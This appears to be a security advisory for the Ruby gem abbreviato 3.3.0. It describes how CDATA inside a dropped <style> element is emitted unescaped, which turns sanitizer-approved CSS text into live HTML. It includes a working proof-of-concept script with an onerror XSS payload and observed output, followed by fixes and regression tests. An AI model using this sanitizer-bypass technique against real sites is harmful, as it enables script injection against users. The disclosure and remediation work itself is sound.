# abbreviato ≤ 3.3.0 — CDATA content escapes a dropped element unescaped, turning inert `<style>` text into live HTML

**Target:** https://github.com/zendesk/abbreviato (Zendesk Public Repositories)
**Affected:** abbreviato 3.3.0 (current RubyGems release) and earlier — repo HEAD `f7fcf3d`
**File:** `lib/abbreviato/truncated_sax_document.rb`

---

## Summary

`Abbreviato.truncate` walks HTML with a Nokogiri SAX handler, `TruncatedSaxDocument`. When an
element's opening tag does not fit the remaining byte budget, the handler drops that element by
entering "ignore mode", so the element and everything inside it is meant to be omitted from the
output.

Two of the SAX callbacks do not honour that mode:

| callback | checks `ignore_mode?` | escapes output |
|---|---|---|
| `characters` (`:64`) | yes | yes |
| `end_element` (`:112`) | yes | n/a |
| `comment` (`:84`) | **no** | n/a |
| `cdata_block` (`:103`) | **no** | **no — appended verbatim** |

So when a container element is dropped, the `<style>` start tag inside it is correctly suppressed —
but the `<style>` body is still written to the output buffer, raw, and now sits at top level with no
element wrapping it. Bytes that were CDATA (text) inside `<style>` become parsed markup.

This is a context-escape primitive: it converts inert text into live HTML.

Inside `<style>`, the string `<img src=x onerror=...>` is CSS text, not an element. An HTML
sanitizer that permits `<style>` — normal for email and ticket rendering — parses that correctly and
leaves it alone, because there is no element there to strip. After truncation the same bytes are
top-level HTML and the browser parses them as an `<img>` carrying an event handler. A pipeline that
sanitizes and then truncates therefore emits attacker-controlled markup that its sanitizer
deliberately passed. Truncating email/ticket HTML that carries CSS is abbreviato's documented use
case; the gem's own suite notes CDATA support exists because a "real-world example … requires cdata
support to bring in the CSS" (`spec/abbreviato/abbreviato_spec.rb:203`).

**Preconditions, stated plainly because they bound the severity:** truncation must run *after*
sanitization, and the sanitizer must permit `<style>`. Where a pipeline truncates first, or strips
`<style>`, this is not reachable. I have not enumerated Zendesk's internal callers — this is
reported against the public gem.

### Root cause

```ruby
# lib/abbreviato/truncated_sax_document.rb

def characters(decoded_string)        # :64
  if max_length_reached? || ignore_mode?   # <- honours ignore mode
    ...

def end_element(name)                 # :112
  if ignore_mode?                          # <- honours ignore mode
    ...

def comment(string)                   # :84
  comment = comment_tag(string)            # <- no ignore_mode? check
  ...

def cdata_block(string)               # :103
  if string.bytesize <= remaining_length
    append_to_truncated_string(string)     # <- no ignore_mode? check, no escaping
```

Call sequence for the PoC input:

1. `start_element("div", …)` — opening + closing tag exceed `remaining_length`, so
   `enter_ignored_level` is called and ignore mode is on (`:50-55`).
2. `start_element("style")` — suppressed by ignore mode, so no `<style>` is written (`:42-45`).
3. `cdata_block(".a{color:red}<img src=x onerror=…>")` — not gated on ignore mode, fits the budget,
   appended verbatim.
4. Output is the CSS body with no `<style>` wrapper — now live markup.

Trigger condition: `bytesize(cdata) <= max_length < bytesize(outer opening tag + closing tag)`.
For the PoC input that is 55 ≤ `max_length` < 84; verified reproducing for all 29 values in 55–83.

The same missing guard in `comment` leaks the contents of a dropped subtree into the output as a
comment (verified separately: a comment inside a dropped `<div>` survives truncation). That one does
not by itself escape its context, but it is the same bug and should be fixed in the same place.

---

## Proof of concept

Self-contained, runs against the published gem — no source checkout needed:

```bash
gem install abbreviato activesupport
ruby abbreviato_cdata_escape.rb
```

(`activesupport` is required because abbreviato calls `String#blank?` but does not declare it as a
dependency; inside a Rails host it is already loaded.)

```ruby
#!/usr/bin/env ruby
require "active_support/core_ext/object/blank"
require "abbreviato"
require "nokogiri"

PAD   = "padding-" * 8
INERT = '<div class="' + PAD + '"><style>.a{color:red}' \
        '<img src=x onerror=alert(document.domain)></style></div>'

out, truncated = Abbreviato.truncate(INERT, max_length: 60, tail: "")

puts Nokogiri::HTML.fragment(INERT).css("img").length        # => 0  (input: inert CSS text)
puts out
puts Nokogiri::HTML.fragment(out).css("img[onerror]").length # => 1  (output: live element)
```

**Input** — the `<img>` is CSS text inside `<style>`, i.e. exactly what a `<style>`-permitting
sanitizer passes through untouched:

```html
<div class="padding-padding-padding-padding-padding-padding-padding-padding-"><style>.a{color:red}<img src=x onerror=alert(document.domain)></style></div>
```

**Output** of `Abbreviato.truncate(input, max_length: 60, tail: "")`:

```html
.a{color:red}<img src=x onerror=alert(document.domain)>
```

**Observed run (abbreviato 3.3.0, Ruby 3.3.6, nokogiri 1.19.4):**

```
abbreviato version: 3.3.0

live <img> elements when input is parsed as HTML: 0
live <img onerror> elements in output:            1
<style> wrapper still present:                    false
truncated flag:                                   true

RESULT: VULNERABLE -- inert CSS text was emitted as live HTML.
```

Zero live image elements go in; one live image element with an `onerror` handler comes out.

---

## Remediation

**1. Gate both callbacks on ignore mode, exactly as `characters` already is.** This is the actual
fix — content belonging to an element that was dropped must not reach the output at all:

```ruby
def comment(string)
  if max_length_reached? || ignore_mode?
    @truncated = true
    return
  end
  # ... existing body
end

def cdata_block(string)
  if max_length_reached? || ignore_mode?
    @truncated = true
    return
  end
  # ... existing body
end
```

**2. Do not append CDATA bytes to the buffer raw.** `cdata_block` currently writes its argument
verbatim. That content is only safe while it sits inside the element it came from. Even with the
ignore-mode guard in place, `cdata_block` should re-emit the enclosing context — write the CDATA
only when the element that owns it was itself emitted, and otherwise escape or drop it — so that a
future path that reaches the callback outside its element cannot promote text to markup again.

**3. Regression tests** covering: CDATA inside an element dropped for budget reasons produces no
`<img>` in the parsed output; a comment inside a dropped element does not survive; and the existing
CSS-passthrough test (`spec/abbreviato/abbreviato_spec.rb:203`) still passes when the element *is*
emitted.

**Consumer-side mitigation, until a patched gem ships:** sanitize *after* truncating rather than
before, or strip `<style>` before truncation. Either breaks the chain.
